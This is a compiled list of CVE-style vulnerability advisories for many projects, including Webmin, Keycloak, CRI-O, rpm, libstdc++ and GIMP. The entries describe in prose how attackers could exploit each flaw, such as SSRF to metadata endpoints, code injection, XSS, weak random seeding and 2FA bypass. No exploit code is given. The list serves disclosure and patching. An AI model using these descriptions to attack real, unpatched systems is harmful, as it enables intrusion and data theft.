one-hub through 0.14.27 contains a server-side request forgery vulnerability in GetImageFromUrl in common/image/image.go that fetches vision chat image_url values without destination restrictions. Attackers holding a standard non-admin API token can send crafted /v1/chat/completions requests via Claude, OpenRouter or Ollama providers to reach internal services or cloud metadata endpoints.

A vulnerability was found in sonos tract up to 0.23.4. The affected element is the function InferenceRulesOp::rules of the file onnx/src/ops/math/gemm.rs of the component Operand Arity Indexing. The manipulation of the argument inputs/outputs results in out-of-bounds read. The attack can be executed remotely. The exploit has been made public and could be used. Upgrading to version 0.23.5 is sufficient to fix this issue. The patch is identified as 44c6f4a7ef988a5bafe98c8bb465d8a253599395. It is recommended to upgrade the affected component.

Mongoose Embedded Web Server / Networking Library before 7.24 contains a WebSocket fragmentation validation vulnerability that allows remote attackers to spoof message metadata by sending a single CONTINUATION frame with FIN=1 as the first data frame instead of a required TEXT/BINARY start frame, violating RFC 6455 sequencing rules. Attackers can craft this malformed frame to make mg_ws_cb() in src/ws.c misinterpret the first byte of payload as saved FIN/opcode flags, causing the application to receive a dispatched MG_EV_WS_MSG event with attacker-controlled flags and data truncated by one byte without closing the connection.

A vulnerability was identified in OpenZipkin Zipkin 3.6.1. This affects the function UnzippingBytesRequestConverter.convertRequest of the file zipkin-server/src/main/java/zipkin2/server/internal/ZipkinHttpCollector.java of the component HTTP Collector. Such manipulation leads to highly compressed data. The attack can be executed remotely. The pull request to fix this issue awaits acceptance.

free5GC PCF through 1.4.6 contains a resource leak in postAppSessCtxProcedure that leaves PCC rules and QoS data in the SM policy decision after rejected Npcf_PolicyAuthorization create requests. Authenticated AFs knowing an active PDU session's UE address can send repeated failing requests with distinct AF application identifiers to grow PCF memory and pollute policy sent to the SMF.

diffpy.structure before 3.5.1 contains a code execution vulnerability that allows attackers to run Python code by supplying crafted CIF symmetry operations passed to eval() in get_symop(). Attackers can embed expressions in the _space_group_symop_operation_xyz or _symmetry_equiv_pos_as_xyz loop to execute code with victim privileges when the CIF file is parsed locally.

A vulnerability was detected in itsourcecode Banking Management System 1.0. This impacts an unknown function of the file manage_donation.php of the component Donor Management. The manipulation of the argument ID results in sql injection. The attack may be performed from remote. The exploit is now public and may be used.

A vulnerability was identified in Gladys Assistant up to 4.71.0. This affects an unknown function of the file gateway.downloadBackup.js of the component Backup Restore Endpoint. The manipulation of the argument file_url leads to os command injection. The attack can be initiated remotely. The exploit is publicly available and might be used. Upgrading to version 4.72.0 mitigates this issue. Upgrading the affected component is recommended.

A security vulnerability has been detected in Matthias-Wandel jhead up to 3.3. This affects the function RemovePngSectionByType/RemovePngSection of the file src/pngfile.c of the component PNG Section Handler. The manipulation leads to double free. Remote exploitation of the attack is possible. The exploit has been disclosed publicly and may be used. The project was informed of the problem early through an issue report but has not responded yet.

A flaw has been found in Konstanty libmodplug up to 0.8.9.1. The affected element is the function abc_add_drum of the file src/load_abc.cpp of the component ABC File Handler. Executing a manipulation can lead to out-of-bounds read. The attack may be performed from remote. Upgrading to version 0.8.9.2 is sufficient to fix this issue. This patch is called 540f0b8ec3d7979e17a8d6a55e31b8a7b734d463. It is recommended to upgrade the affected component.

A security flaw has been discovered in nodejs undici up to 7.24.0. This affects the function Object.assign of the file balanced-pool.js of the component BalancedPool. The manipulation results in improperly controlled modification of object prototype attributes. The attack may be launched remotely. The exploit has been released to the public and may be used for attacks. Upgrading to version 7.24.1 is able to mitigate this issue. The patch is identified as 0d7ec33ff37563d3e7c98d11d7bca736f330d156. You should upgrade the affected component.

A flaw was found in crun. When copying files onto a tmpfs mounted with tmpcopyup, crun opens the destination a second time by name. A container that shares a writable volume with the container being created can change that path between the two lookups, so crun copies image files onto host files, including files under /proc/sys.

A flaw has been found in hrshadhin CloudSchool up to 3.0.1. Affected by this issue is the function PublicController.checkSanity4Student of the file app/Http/Controllers/Backend/PublicController.php of the component Student Data Access Check. This manipulation of the argument student_id causes authorization bypass. The attack can be initiated remotely. The exploit has been published and may be used. The project was informed of the problem early through an issue report but has not responded yet.

A vulnerability has been found in sumiie24 School-Management-System up to d946d649c7c95e101fc5679ecd91999533bb10d7. The affected element is an unknown function of the file parent_Registration.php. Such manipulation of the argument student_reg leads to sql injection. The attack can be executed remotely. The exploit has been disclosed to the public and may be used. This product implements a rolling release for ongoing delivery, which means version information for affected or updated releases is unavailable.

A flaw was found in Keycloak. When a client application enforces step-up authentication or multi-factor authentication (MFA) via a minimum authentication level, Keycloak fails to apply this requirement to login sessions initiated through the credential reset endpoint. An attacker who possesses a user's initial credentials (such as a password) can navigate from the reset interface back to the standard login form and authenticate without completing the required second factor. This flaw allows an attacker to obtain valid access tokens and gain unauthorized access to protected services without satisfying mandatory security controls.

BeamNG.drive before 0.40.6 contains an out-of-bounds write vulnerability because JIT-compiled LuaJIT traces omit FFI array bounds checks, letting untrusted Lua escape the sandbox. Attackers supplying a malicious mod can JIT-compile an FFI store loop, write out of range using a tostring() address leak, re-enable ffi.load, and run commands as the game user.

lwext4 through 1.0.0 contains a heap buffer overflow in ext4_fs_init_inode_bitmap() in src/ext4_fs.c because it does not validate s_inodes_per_group against the inode bitmap size. Attackers can supply a crafted ext4 image with an oversized s_inodes_per_group so memset writes past the heap buffer, corrupting memory and crashing the mounting application.

A vulnerability was identified in Dolibarr ERP CRM up to 23.0.4. This affects the function dol_convert_file in the library htdocs/core/lib/files.lib.php of the component Document Upload. Such manipulation leads to code injection. The attack can be launched remotely. The exploit is publicly available and might be used. Upgrading to version 24.0.0 is able to mitigate this issue. The name of the patch is 9b6368b2a9eae3eec690b2ce22c4f291f0051540. Upgrading the affected component is advised.

A flaw was found in CRI-O's container-creation environment-variable handling
(`mergeEnvs` in `server/utils.go`, consumed by `setupContainerEnvironmentAndWorkdir` in
`server/container_create.go`). When a `CreateContainer` request supplies a `nil` CRI
`Envs` field, CRI-O falls back to using the target OCI image's `config.Env` entries
unfiltered, in contrast to the normal merge path, which validates each entry for a
`key=value` form before use. An OCI image whose `config.Env` contains an entry with no
`=` character (e.g. a bare `NOEQUALS` string) causes CRI-O to split that entry into a
single-element slice and then index its second element, which is out of range. This
triggers an unrecovered Go runtime panic in the `crio` daemon process, crashing it and
terminating the container-runtime service for all workloads on the node until it is
restarted.
Greenbone gvmd before 26.43.0 does not restrict certificate creation. Even the Observer role, documented to be read-only, can execute create_tls_certificate.

A vulnerability was found in CRI-O. A path traversal issue in the log management functions (UnMountPodLogs and LinkContainerLogs) may allow an attacker with permissions to create and delete Pods to unmount arbitrary host paths, leading to node-level denial of service by unmounting critical system directories.

Webmin through 2.670 contains a stored cross-site scripting vulnerability in apache/restart.cgi that displays the last five Apache ErrorLog lines without HTML escaping. Unauthenticated attackers can inject script into error_log via malformed requests or denied paths, executing in a Webmin user's session when Apache fails to restart.

Webmin through 2.670 contains a stored cross-site scripting vulnerability in ldap-useradmin/raw.cgi that allows attackers with LDAP attribute write access to inject markup. Attackers can store script in user or group attributes or the dn, which executes in an administrator's browser when viewing the raw entry.

Webmin through 2.670 contains a stored cross-site scripting vulnerability in mailboxes/detach.cgi that allows unauthenticated mail senders to bypass the HTML sanitizer. Attackers can send HTML attachments with entity-obfuscated javascript: schemes or encoded script tags in iframe srcdoc to execute script in the Webmin session of users opening them.

Webmin through 2.670 contains a stored cross-site scripting vulnerability in mysql/view_table.cgi that allows MySQL users to inject scripts via unescaped column names. Attackers with CREATE or ALTER privilege can create columns containing HTML payloads that execute in a Webmin administrator's session when the table is viewed.

Webmin through 2.670 contains a stored cross-site scripting vulnerability in lpadmin/list_jobs.cgi that allows local users or network IPP clients to inject script via CUPS print-job titles. Attackers can submit a print job with a crafted title, for example using lp -t, to execute script in a Printer Administration user's Webmin session.

Webmin through 2.670 contains a stored cross-site scripting vulnerability in ldap-server/edit_browser.cgi that allows attackers with write access to LDAP entry attributes to inject script by storing markup in attribute values. When an administrator browses the entry in the LDAP Server directory browser, the unencoded script runs in the Webmin origin, letting attackers act with the administrator's session.

Webmin through 2.670 contains a Perl code injection vulnerability in cluster-useradmin/sync.cgi that allows attackers to run code by placing single quotes in home directory paths. Attackers with root on one managed host can craft a home path that breaks out of remote_eval() string literals during Sync, executing Perl as root on other managed hosts.

Webmin through 2.670 contains a stored cross-site scripting vulnerability in the Upload and Download module that allows attackers to inject script via unescaped HTTP status lines from background downloads. Attackers controlling a download server can return a malicious status line stored by updown/download.pl and printed unescaped by updown/index.cgi, executing script in a higher-privileged user's session.

Webmin through 2.670 contains a weak random password generation vulnerability in generate_random_password() that allows attackers to predict generated account passwords because seed_random() effectively seeds Perl rand() with only time XOR process ID. When the non-default random_password option is enabled and administrators keep the pre-filled password in edit_user.cgi, attackers can enumerate time and PID seeds to recover passwords and authenticate as new accounts.

Webmin through 2.670 contains a stored cross-site scripting vulnerability in postfix/view_mailq.cgi and sendmail/view_mailq.cgi that allows unauthenticated attackers to inject script via unsanitized MIME attachment filenames. Attackers can send a message with a crafted Content-Disposition or Content-Type filename that remains queued, executing script in the Webmin session of users viewing it.

Webmin through 2.670 contains a stored cross-site scripting vulnerability that allows local users or directory writers to inject script by placing markup in user names, group names or GECOS fields. Attackers can set GECOS via chfn or modify LDAP, NIS or SSSD entries so unescaped values in my_user_chooser.cgi, my_group_chooser.cgi, user_chooser.cgi and group_chooser.cgi execute in a Webmin user's browser.

Webmin through 2.670 contains a stored cross-site scripting vulnerability in the Disk Quotas module that allows directory administrators to inject markup via NSS user names. Attackers who can create or rename LDAP, NIS or SSSD identities owning blocks on XFS quota filesystems can execute script in the browser of administrators viewing quota/list_users.cgi.

Webmin through 2.670 contains an improper certificate validation vulnerability that allows man-in-the-middle attackers to capture credentials because servers/save_serv.cgi skips the selected SSL certificate check. When fast RPC is set to Automatic, attackers intercepting the /fastrpc.cgi probe can obtain the remote Webmin username and password sent via HTTP Basic Authorization.

Webmin through 2.670 contains a stored cross-site scripting vulnerability in init/mass_systemd.cgi that prints unescaped journalctl output when a systemd service fails to start. Attackers can inject script into the journal via logger or sshd invalid user names, executing it in an administrator's Webmin session.

Webmin through 2.670 contains a weak randomness vulnerability that allows attackers to predict TOTP two-factor secrets generated by generate_base32_secret() using a time and PID seeded rand(). Attackers who know a user's password and estimate enrollment time can enumerate candidate seeds, reproduce the secret, and bypass the second authentication factor.

Webmin through 2.670 contains a STARTTLS downgrade vulnerability in send_mail in mailboxes/boxes-lib.pl that continues over plaintext when STARTTLS is rejected. Man-in-the-middle attackers can strip or reject STARTTLS to capture configured SMTP AUTH credentials, crackable CRAM-MD5 exchanges, and the content of sent mail.

Webmin through 2.670 contains a stored cross-site scripting vulnerability in minecraft/save_backup.cgi that allows local attackers with write access to the Minecraft server directory to inject script via unescaped world directory names. Attackers can create a world directory containing HTML or script that executes in a Webmin user's session when they run Backup Now.

Webmin through 2.670 contains a missing authentication vulnerability in fastrpc.cgi that allows unauthenticated network peers to connect to tcpwrite and tcpread file-transfer listeners without session checks. Attackers can race to connect to the predictable transfer port during cluster operations to steal transferred files or replace staged packages, achieving root code execution.

Webmin through 2.670 contains a stored cross-site scripting vulnerability in proc/trace.cgi that allows local unprivileged OS users to inject markup via unescaped process arguments and system call parameters. Attackers can craft process command lines or file names passed to open so that script executes in a Webmin user's session when they trace the process.

Webmin through 2.670 contains a cleartext transmission vulnerability in the SMTP service monitor that never issues STARTTLS because get_smtp_status tests an undefined $ssl variable. Passive network attackers can capture AUTH PLAIN credentials sent in plaintext each time a STARTTLS-configured monitor runs, without needing a Webmin login.

Webmin through 2.670 contains a stored cross-site scripting vulnerability in useradmin/edit_user.cgi that displays home directory paths without HTML escaping to users with the autohome ACL. A Webmin user with broader Users and Groups rights can store a home path containing script via save_user.cgi, executing it in a restricted sub-administrator's Webmin session.

A flaw was found in rsyslog. When processing log entries using certain JSON (JavaScript Object Notation) formatting templates, the service fails to properly escape input composed entirely of quotation marks or backslashes. An attacker who can supply logged input can exploit this issue to generate malformed JSON output, which may cause downstream log ingestion systems and parsers to reject log records.

A flaw was found in rsyslog. When process identification (PID) rewriting is enabled in the imuxsock module, a local attacker with access to the logging socket can send a crafted log message with an empty tag. This triggers an invalid memory write, causing the logging service to crash and resulting in a Denial of Service (DoS).

COVESA Open1722 before 0.9.8 contains an out-of-bounds read vulnerability in Avtp_Vss_CalcVssPathLength in src/avtp/acf/custom/Vss.c, which reads the INTEROP path-length prefix without checking the declared ACF message length. Attackers can send header-only 12-byte INTEROP-mode VSS frames to trigger reads past the buffer, or prefix values 0xFFFE and 0xFFFF that wrap uint16 lengths and cause Avtp_Vss_SetVssData to overwrite the path area.

Shopify async-memcached before 0.11.0 contains a command injection vulnerability in Client::validate_meta_flags that allows attackers to inject extra memcached meta protocol tokens via whitespace in flags. Attackers controlling part of a meta flag can add quiet, opaque, mode or size override tokens to alter operations and desynchronize responses on shared connections.

pain001-mcp 0.0.72 before 0.0.80 contains a path traversal vulnerability in the commit_payment_batch MCP tool that allows attackers to write files outside any output directory via output_file_path. Attackers can stage a batch, reuse the self-issued confirmation_token, and supply absolute, dot-dot, or symlinked paths to create or overwrite server-writable files with generated XML.

LTplus-AG ifc-lite @ifc-lite/export before 4.13.1 and ifc-lite-export before 27.0.0 contain a STEP record injection vulnerability in the mutation writer via unescaped typed-value type names. Attackers controlling the mutations payload can place parentheses, semicolons, and newlines in typed.type to append arbitrary entity records to exported IFC files, bypassing the class-name guard.

ai-memory 2.6.0 before 3.3.2 contains a symlink following vulnerability in the ai-memory-wikisync companion that allows local attackers to overwrite arbitrary files by planting symlinks at predictable temporary names. Attackers can place a .wikisync-tmp-<page>.md symlink in a shared destination so atomic_write() truncates and overwrites its target with the victim's privileges.

SRS 4.0.0 before 6.0.194, 7.0.0 before 7.0.214, and 8.0.0 before 8.0.73 contains a heap-based buffer overflow in SrsRtcpCommon::decode and SrsRtcpTWCC::decode that lets remote WebRTC peers write past the fixed 1500-byte payload_ array. Unauthenticated attackers opening a WHIP or WHEP session can send oversized BYE, APP, unknown-type or TWCC RTCP packets to overwrite up to 64 KB of heap memory, crashing the server.

Nektos act 0.2.92 before 0.2.95 contains an argument injection vulnerability in readProjectArgsFile and projectFlag that allows malicious repositories to bypass the untrusted project .actrc flag allowlist. Attackers can commit a crafted .actrc smuggling disallowed flags like -P self-hosted or --privileged to run workflow steps on the developer's host.

Electerm before 5.9.0 contains an origin validation vulnerability in the MCP Server widget that allows remote attackers to execute commands by bypassing Host and Origin checks through DNS rebinding. Attackers can lure users to a page that rebinds to 127.0.0.1 and calls unauthenticated MCP tools on port 30837 to run OS commands locally and on open SSH sessions.

A vulnerability was identified in nliautaud pico-content-editor up to 02d5ad6c820c5050c542ab9505819b5e0a0ba1af. Affected by this vulnerability is the function Uploads::saveFile/Auth::init of the file src/Uploads.php of the component Authorization Subsystem. Such manipulation of the argument PicoContentEditorUpload leads to unrestricted upload. The attack may be launched remotely. The exploit is publicly available and might be used. This product operates on a rolling release basis, ensuring continuous delivery. Consequently, there are no version details for either affected or updated releases. The vendor was contacted early about this disclosure but did not respond in any way. This vulnerability only affects products that are no longer supported by the maintainer.

A flaw was found in the libstdc++ component of GCC. An attacker who can provide an excessively large element count to a boolean vector (std::vector<bool>) constructor can trigger an integer wrap during internal memory calculations. This issue leaves the container in an inconsistent state, leading to out-of-bounds memory access and resulting in an application crash or a Denial of Service (DoS) during subsequent operations.

A flaw was found in GCC. An out-of-bounds memory access vulnerability exists in the libstdc++ parallel search implementation due to an undersized internal buffer. A local attacker can exploit this flaw by providing crafted search data to an application compiled with parallel mode, causing the process to crash and leading to a Denial of Service (DoS).

clnttcp_call() in lib/rpc/clnt_tcp.c in MIT Kerberos 5 (aka krb5) does not free the RPC reply verifier between retries, which allows remote attackers to cause a denial of service (memory leak in GSS-RPC client programs) by injecting RPC replies with mismatched XIDs or by triggering authentication retries.

When an application calls the erase_if function on a binary heap priority queue in libstdc++, the library reallocates storage but fails to update its internal entry pointer. An attacker capable of triggering this operation can exploit this use-after-free condition, leading to a Denial of Service (DoS) via an application crash or potential memory corruption.

cves.d: A flaw was found in rpm. An attacker can exploit a command injection vulnerability by influencing the path or filename of a tarball processed by `rpmbuild -t*` to include shell metacharacters. This is particularly relevant in automated build or continuous integration (CI) workflows that ingest externally supplied artifact names. Successful exploitation allows for arbitrary command execution with the privileges of the build user, which could lead to information disclosure or disruption of the build environment.

cves.d: A vulnerability was found in RPM's rpmbuild tarball processing. When processing a crafted source archive, the getTarSpec() function in tools/rpmbuild.cc passes an attacker-controlled tar archive member name to rpmExpand() as part of a %{basename:...} macro expression. A specially crafted .spec member name can therefore inject RPM macros, including Lua expressions, resulting in arbitrary code execution with the privileges of the user running rpmbuild. This can be exploited when a victim or automated build system processes an attacker-controlled source tarball using rpmbuild tarball mode (such as -ts, -ta, or -tb).

cves.d: A flaw was found in the libblkid library of util-linux. During nested partition probing, the BSD, Minix, Solaris x86, and UnixWare partition probers cache a raw pointer to a parent partition entry in a dynamically allocated array. When subsequent partition additions cause the array to be reallocated, this pointer becomes stale, leading to a heap use-after-free read. An attacker who can present a crafted block device image (for example, via USB insertion or a loop-mounted disk image) can trigger this flaw without user interaction, as libblkid is invoked automatically by udev/udisks as root on block-device hot-plug events. This could lead to limited information disclosure or denial of service.

cves.d: A flaw was found in openstack-network-exporter. The HTTP server within the component is configured without essential timeout settings, such as ReadHeaderTimeout. This vulnerability allows an unauthenticated, remote attacker to initiate multiple slow HTTP header connections. By trickling header bytes, the attacker can exhaust server resources, specifically file descriptors, leading to a Denial of Service (DoS) that prevents legitimate Prometheus metric scraping and alerting.

cves.d: A flaw was found in openstack-network-exporter. When an operator configures user authentication but omits or misconfigures Transport Layer Security (TLS), the basic authentication mechanism is silently bypassed. This fail-open design allows an adjacent network attacker to access sensitive Open vSwitch (OVS) and Open Virtual Network (OVN) dataplane metrics without credentials. Consequently, an attacker can enumerate bridge names, port counters, OVN controller state, and host topology, leading to information disclosure.

cves.d: A vulnerability was found in browser-use 0.13.13/0.13.14. This impacts the function load_and_migrate_config of the file browser_use/config.py of the component SecurityWatchdog. The manipulation results in improper authorization. The attack requires a local approach. The exploit has been made public and could be used.

A flaw was found in Keycloak. The User-Managed Access (UMA) 2.0 Protection API endpoint for permission tickets fails to enforce the `uma_protection` role check. This allows any authenticated user with a token issued for a resource server client, even without the `uma_protection` role, to enumerate all permission tickets in the system. This vulnerability partial leads to information disclosure.

A flaw was found in Keycloak. An administrator with `manage-clients` permission can exploit a misconfiguration where this permission is equivalent to `manage-permissions`. This allows the administrator to escalate privileges and gain control over roles, users, or other administrative functions within the realm. This privilege escalation can occur when admin permissions are enabled at the realm level.

The server fails to enforce size limits during DEFLATE decompression, leading to an OutOfMemoryError (OOM) and subsequent process termination. cves.d: A vulnerability has been found in JaguarJack catch-admin up to 5.4.1. This affects the function update of the file modules/Permissions/Http/Controllers/RolesController.php. The manipulation leads to dynamically-determined object attributes. The attack can be initiated remotely. The exploit has been disclosed to the public and may be used. The identifier of the patch is 3ae60d57ea6840bb33456596ad799b0a39ca94a2. It is recommended to apply a patch to fix this issue.

A flaw was found in Libsoup. The server-side digest authentication implementation in the SoupAuthDomainDigest class does not properly track issued nonces or enforce the required incrementing nonce-count (nc) attribute. This vulnerability allows a remote attacker to capture a single valid authentication header and replay it repeatedly. Consequently, the attacker can bypass authentication and gain unauthorized access to protected resources, impersonating the legitimate user.

A flaw was found in libsoup. An integer underflow vulnerability occurs when processing content with a zero-length resource, leading to a buffer overread. This can allow an attacker to potentially access sensitive information or cause an application level denial of service.

A flaw was found in GIMP. An integer overflow vulnerability exists when processing ICO image files, specifically in the `ico_read_info` and `ico_read_icon` functions. This issue arises because a size calculation for image buffers can wrap around due to a 32-bit integer evaluation, allowing oversized image headers to bypass security checks. A remote attacker could exploit this by providing a specially crafted ICO file, leading to a buffer overflow and memory corruption, which may result in an application level denial of service.

A flaw was found in GIMP's PSP (Paint Shop Pro) file parser. A remote attacker could exploit an integer overflow vulnerability in the read_creator_block() function by providing a specially crafted PSP image file. This vulnerability occurs when a 32-bit length value from the file is used for memory allocation without proper validation, leading to a heap overflow and an out-of-bounds write. Successful exploitation could result in an application level denial of service.

Strong::Random versions through 0.96 for Perl allow every later rand output to be predicted from three earlier ones.

The generator keeps its state in a single number. Each call multiplies the state by a factor derived from it, and the returned digits encode that factor, so three consecutive outputs determine the state however the generator was seeded. Outputs are also biased: the first digit after the decimal point is never zero, so rand(256) never returns 1 to 24.

An attacker who sees three consecutive outputs can predict the tokens, passwords or key bytes that the same object later issues to other users.

A flaw was found in luksmeta. Improper boundary validation of metadata slots allows an attacker capable of supplying or modifying a disk header to redirect wipe or load operations outside the intended metadata area. An attacker could exploit this vulnerability by providing a crafted header with valid checksums to overwrite or zero out encrypted payload data, resulting in persistent data loss and corrupted storage. Exploitation typically requires privileged access to modify raw block devices or the ability to induce an administrator to process an untrusted disk image.

A flaw was found in the keycloak-services component of Keycloak, which is used for managing authentication and authorization flows. The issue occurs when a client policy is configured to enforce a high-assurance authentication flow requiring OTP. Due to improper validation of existing sessions, a lower-assurance password-only SSO session can be incorrectly accepted if the request does not explicitly demand a specific assurance level. This allows an attacker with access to a user's password or session to bypass the second factor and obtain tokens claiming a higher level of security.
A flaw was found in Podman. If an attacker can pass a crafted tar archive to the `podman load` command, they can create files on the host machine with the privileges of the user running Podman.
